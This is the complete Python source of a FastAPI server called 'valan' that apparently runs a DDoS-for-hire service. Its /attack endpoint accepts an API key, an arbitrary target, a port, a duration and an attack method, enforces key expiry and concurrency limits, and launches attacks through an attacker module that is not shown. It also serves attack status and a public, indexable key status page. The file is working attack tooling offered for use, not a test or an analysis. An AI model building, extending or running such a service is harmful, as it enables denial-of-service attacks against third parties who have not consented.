# api.py — valan API server (FastAPI)
# endpoints:
#   GET /attack?key=&target=&port=&time=&method=   -> launch attack
#   GET /status?id=                                 -> attack status
#   GET /key/<key>                                  -> public status page (googleable)
#   GET /health                                     -> liveness
import asyncio, secrets, time, html, uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
import db
from config import API_HOST, API_PORT, API_PUBLIC, MAX_CONCURRENT, MAX_TIME
from attacker import run as run_attack, ALL_METHODS

app = FastAPI(title="valan api", docs_url=None, redoc_url=None)
_tasks: dict[str, asyncio.Task] = {}

@app.on_event("startup")
async def _startup():
    db.conn()
    db.cleanup_stale()

def _err(msg, code=400):
    return JSONResponse({"status":"error","message":msg}, status_code=code)

def _validate_key(key):
    row = db.get_key(key)
    if not row:
        return None, "invalid key"
    _, owner, exp, active = row
    if not active:
        return None, "key disabled"
    if exp and exp != 0 and exp < int(time.time()):
        return None, "key expired"
    return row, None

@app.get("/health")
async def health():
    return {"status":"ok","ts":int(time.time())}

@app.get("/attack")
async def attack(key: str, target: str, port: int, time: int = None, method: str = "GET", t: int = None):
    # accept both `time` and `t`
    dur = time if time is not None else t
    if dur is None:
        return _err("missing time")
    if dur < 1 or dur > MAX_TIME:
        return _err(f"time must be 1..{MAX_TIME}")
    if port < 1 or port > 65535:
        return _err("invalid port")
    method = method.upper()
    if method not in ALL_METHODS:
        return _err(f"unknown method: {method}")

    row, err = _validate_key(key)
    if err:
        return _err(err, 403)

    active = db.active_count(key)
    if active >= MAX_CONCURRENT:
        return _err(f"concurrency limit ({MAX_CONCURRENT}) reached — {active} running", 429)

    aid = secrets.token_hex(8)
    db.create_attack(aid, key, target, port, dur, method)
    task = asyncio.create_task(run_attack(aid, target, port, dur, method))
    _tasks[aid] = task

    def _cleanup(_t, aid=aid):
        _tasks.pop(aid, None)
    task.add_done_callback(_cleanup)

    return {
        "status": "started",
        "id": aid,
        "target": target,
        "port": port,
        "time": dur,
        "method": method,
        "concurrent": active + 1,
        "max_concurrent": MAX_CONCURRENT,
    }

@app.get("/status")
async def status(id: str):
    row = db.get_attack(id)
    if not row:
        return _err("not found", 404)
    return {
        "id": row[0], "key": row[1][:6] + "***",
        "target": row[2], "port": row[3], "time": row[4],
        "method": row[5], "status": row[6],
        "started_at": row[7], "finished_at": row[8],
    }

@app.get("/key/{key}", response_class=HTMLResponse)
async def key_page(key: str):
    row = db.get_key(key)
    if not row:
        return HTMLResponse("<h1>API Key: Invalid</h1>", status_code=404)
    _, owner, exp, active = row
    if not active:
        stat = "disabled"
    elif exp and exp != 0 and exp < int(time.time()):
        stat = "expired"
    else:
        stat = "active"
    exp_h = "never" if exp == 0 else time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime(exp))
    body = f"""<!DOCTYPE html><html><head><title>API Key Status — valan</title>
    <meta name="robots" content="index,follow"><meta charset="utf-8">
    <style>body{{font-family:system-ui;background:#1e1f22;color:#dbdee1;padding:40px}}
    .k{{font-family:monospace;background:#2b2d31;padding:12px;border-radius:6px;display:inline-block}}
    .s-active{{color:#57f287}}.s-expired{{color:#faa61a}}.s-disabled{{color:#ed4245}}</style></head>
    <body><h1>valan API Key Status</h1>
    <p>Key: <span class="k">{html.escape(key)}</span></p>
    <p>Status: <b class="s-{stat}">{stat.upper()}</b></p>
    <p>Expires: {exp_h}</p>
    <p>Owner: <span class="k">{html.escape(owner or "unknown")[:8]}***</span></p>
    <p>Endpoint: <code>{API_PUBLIC}/attack?key=...&target=...&port=...&time=...&method=...</code></p>
    </body></html>"""
    return HTMLResponse(body)

if __name__ == "__main__":
    uvicorn.run(app, host=API_HOST, port=API_PORT, log_level="info")